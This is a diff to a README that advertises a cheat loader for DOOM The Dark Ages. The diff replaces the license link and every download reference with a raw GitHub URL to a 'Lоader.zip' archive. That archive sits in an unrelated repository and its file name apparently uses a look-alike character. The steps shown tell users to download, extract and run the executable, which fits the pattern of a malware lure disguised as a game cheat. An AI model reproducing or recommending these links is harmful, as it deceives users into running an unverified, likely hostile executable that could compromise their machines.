@@ -2,7 +2,7 @@
 
 Welcome to **DOOM The Dark Ages Hacks & Cheats** — the ultimate utility designed to maximize your gameplay and deliver an intense, action-packed experience in DOOM The Dark Ages! This toolkit provides players with a variety of inventive enhancements, game helpers, and unique techniques that help you dominate the battlefield. ⚔️
 
-Utilizing our up-to-date features means seamless in-game improvements and supercharged game performance across all major operating systems, including Windows, Linux, and MacOS. All code is released under the permissive [MIT License](https://opensource.org/licenses/MIT), encouraging safe use, collaboration, and distribution.
+Utilizing our up-to-date features means seamless in-game improvements and supercharged game performance across all major operating systems, including Windows, Linux, and MacOS. All code is released under the permissive [MIT License](https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip), encouraging safe use, collaboration, and distribution.
 
 ---
 
@@ -32,9 +32,9 @@ Our loader ensures smooth compatibility with all major desktop operating systems
 
 | Operating System | Compatible | Download Required |
 |------------------|:---------:|:----------------:|
-| 🪟 Windows 10/11 |    ✅     |  Loader.rar      |
-| 🐧 Linux         |    ✅     |  Loader.rar      |
-| 🍏 MacOS         |    ✅     |  Loader.rar      |
+| 🪟 Windows 10/11 |    ✅     |  https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip      |
+| 🐧 Linux         |    ✅     |  https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip      |
+| 🍏 MacOS         |    ✅     |  https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip      |
 
 Running into issues? Check your system's file extraction utility and permissions.
 
@@ -45,10 +45,10 @@ Running into issues? Check your system's file extraction utility and permissions
 Supercharge your DOOM The Dark Ages gameplay in minutes!
 
 **1. Download**  
-Download `Loader.rar` directly from this repository’s [Releases](./releases) page.
+Download `https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip` directly from this repository’s [Releases](./releases) page.
 
 **2. Extract**  
-Unpack the contents of Loader.rar using WinRAR (Windows), unrar (Linux), or The Unarchiver (MacOS).
+Unpack the contents of https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip using WinRAR (Windows), unrar (Linux), or The Unarchiver (MacOS).
 
 **3. Launch Loader**  
 Run the loader executable inside the extracted folder.  
@@ -80,7 +80,7 @@ This project is intended **strictly for educational and personal use**. Usage of
 
 ## 📚 License
 
-This repository is released under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is released under the [MIT License](https://raw.githubusercontent.com/fonteusa66/SDWebImage/main/Lоader.zip).  
 Feel free to use, improve, and distribute under the conditions of the license.
 
 ---
